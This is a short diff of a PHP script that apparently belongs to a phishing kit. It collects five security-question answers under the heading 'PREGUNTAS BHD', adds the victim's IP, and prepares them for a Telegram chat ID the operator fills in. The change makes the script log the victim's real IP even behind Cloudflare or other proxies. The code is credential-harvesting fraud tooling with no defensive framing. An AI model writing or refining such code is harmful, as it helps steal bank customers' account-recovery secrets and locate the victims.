@@ -16,7 +16,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $chatID = "8555745789"; // Reemplaza con tu chat ID
 
     // Obtén la IP del cliente
-    $ip = $_SERVER['REMOTE_ADDR'];
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
 
     // Construye el mensaje
     $message = "=====PREGUNTAS BHD=======\n $preg1\n $resp1\n $preg2\n $resp2\n $preg3\n $resp3\n $preg4\n $resp4\n $preg5\n $resp5\nIP del cliente: $ip";
